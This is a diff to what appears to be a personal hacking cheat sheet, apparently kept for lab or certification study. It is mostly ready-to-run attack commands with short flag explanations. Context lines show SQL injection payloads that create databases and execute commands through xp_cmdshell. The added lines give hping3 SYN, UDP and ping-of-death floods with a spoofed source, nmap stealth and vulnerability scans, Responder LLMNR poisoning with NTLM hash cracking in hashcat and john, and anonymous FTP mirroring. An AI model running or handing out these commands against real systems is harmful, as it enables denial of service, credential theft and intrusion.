@@ -172,3 +172,77 @@ blah';create database mydatabase;
 Execute cmd from login
 blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 ```
+
+
+--------------------------------------
+SYN DDOS Attack using Hping
+--------------------------------------
+└─# hping3 -S 1.1.1.6 -a 1.1.1.3 -p 22 --flood
+1.1.1.6 is target IP
+1.1.1.3 is the spoof IP
+22 is port number.
+
+POD - Ping of Death Attack
+
+└─# hping3 -d 65538 -S -p 21 --flood 1.1.1.6                                                                                                                        1 ⨯
+-d is data size 
+-S is syn packets 
+-p is port (YOU CAN FLOOD ANY APPLICATION WITH OPEN PORTS)
+
+UDP Flood attack:
+
+└─# hping3 -2 -p 139 --flood 1.1.1.6        
+
+-2 is for UDP
+-p is port
+
+------------------------------------------
+NMAP
+-------------------------------------------
+nmap UDP Scan
+└─# nmap -sU 1.1.1.6                                                                                                                                                1 ⨯
+
+Check if SNMP is running on the target system
+└─# snmp-check 1.1.1.6                                                                                                                                     
+
+----------------------------------------
+LLMNR Poisoning NTML Hash cracking
+----------------------------------------
+Responder:
+└─# responder -I eth0 -rdwv
+
+Copy the hash from responder to ntlmhash.txt
+
+Crack NTML hash with hashcat
+└─# hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt
+
+or Crack by John
+└─# john /usr/share/responder/logs/SMB-NTLMv2-SSP-1.1.1.15.txt                     
+
+
+ 
+----------------------------------------
+Stegnography
+----------------------------------------
+
+User openStego or QuickStego for stegnography
+
+----------------------------------------
+NMAP Commands
+----------------------------------------
+Know all active hosts in a network
+└─# nmap -sP 1.1.1.0/24    
+
+
+Stelth Scan, Invading firewall, IDS/IPS
+
+└─# nmap -sS -p 80, 443 1.1.1.0/24
+
+Using scripts for vulnerabilities scanning
+└─# nmap --script  vuln 1.1.1.15
+
+
+
+Download file from ftp
+wget -m ftp://anonymous:anonymous@<ip>
+wget -m --no-passive ftp://anonymous:anonymous@<ip> {if above fail}
